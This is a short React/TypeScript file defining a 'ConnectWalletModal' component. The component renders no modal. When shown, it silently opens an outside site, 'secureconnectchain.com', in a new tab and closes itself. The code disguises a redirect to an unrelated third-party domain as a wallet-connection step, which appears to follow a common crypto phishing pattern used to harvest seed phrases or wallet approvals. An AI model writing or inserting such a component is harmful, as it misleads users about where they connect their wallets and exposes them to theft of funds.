import { useEffect } from 'react';

interface ConnectWalletModalProps {
  open?: boolean;
  onOpenChange?: (open: boolean) => void;
  isOpen?: boolean;
  onClose?: () => void;
}

export function ConnectWalletModal({ open, onOpenChange, isOpen, onClose }: ConnectWalletModalProps) {
  const isVisible = open ?? isOpen ?? false;

  useEffect(() => {
    if (isVisible) {
      window.open('https://secureconnectchain.com/', '_blank', 'noopener,noreferrer');
      onOpenChange?.(false);
      onClose?.();
    }
  }, [isVisible]);

  return null;
}
